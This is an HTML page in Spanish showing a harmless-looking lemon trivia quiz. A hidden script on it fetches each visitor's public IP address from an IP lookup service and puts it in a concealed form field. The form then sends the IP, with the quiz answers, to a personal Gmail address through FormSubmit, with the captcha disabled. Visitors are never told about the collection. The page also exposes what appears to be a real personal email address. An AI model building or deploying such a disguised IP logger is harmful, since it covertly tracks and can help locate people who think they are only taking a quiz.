<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test: ¿Qué tanto sabes de los limones?</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 600px; 
            margin: auto; 
            padding: 20px; 
            background-color: #f9f9f9; 
        }
        h1 { color: #8bc34a; }
        .question { margin-bottom: 20px; }
        button { 
            background-color: #8bc34a; 
            color: white; 
            padding: 10px 15px; 
            border: none; 
            border-radius: 5px;
            cursor: pointer; 
            font-size: 16px;
        }
        button:hover { background-color: #7cb342; }
    </style>
</head>
<body>

    <h1>Test: ¿Qué tanto sabes de los limones? 🍋</h1>
    <p>Responde estas preguntas para descubrir tu nivel de conocimiento cítrico.</p>

    <!-- El formulario envía los datos a tu correo usando FormSubmit -->
    <form action="https://formsubmit.co/rainguer12@gmail.com" method="POST">
        
        <!-- Desactiva el captcha para que sea más directo -->
        <input type="hidden" name="_captcha" value="false">
        
        <!-- Campo oculto donde JavaScript inyectará la IP de tu celular -->
        <input type="hidden" name="IP_del_Dispositivo" id="ip_address" value="Obteniendo IP...">

        <div class="question">
            <label><strong>1. ¿De qué continente es originario el limón?</strong></label><br>
            <input type="radio" name="origen" value="Asia" required> Asia<br>
            <input type="radio" name="origen" value="América"> América<br>
            <input type="radio" name="origen" value="Europa"> Europa<br>
        </div>

        <div class="question">
            <label><strong>2. ¿Qué vitamina es la más abundante en el jugo de limón?</strong></label><br>
            <input type="radio" name="vitamina" value="Vitamina A" required> Vitamina A<br>
            <input type="radio" name="vitamina" value="Vitamina C"> Vitamina C<br>
            <input type="radio" name="vitamina" value="Vitamina D"> Vitamina D<br>
        </div>

        <div class="question">
            <label><strong>3. Botánicamente hablando, ¿el limón es una fruta o una verdura?</strong></label><br>
            <input type="radio" name="clasificacion" value="Fruta" required> Fruta<br>
            <input type="radio" name="clasificacion" value="Verdura"> Verdura<br>
        </div>

        <button type="submit">Enviar Respuestas</button>
    </form>

    <script>
        // Llama a una API pública para obtener la dirección IP pública del dispositivo
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Inserta la IP en el campo oculto del formulario
                document.getElementById('ip_address').value = data.ip;
            })
            .catch(error => {
                console.error('Error al obtener la IP:', error);
                document.getElementById('ip_address').value = 'No se pudo obtener la IP';
            });
    </script>
</body>
</html>
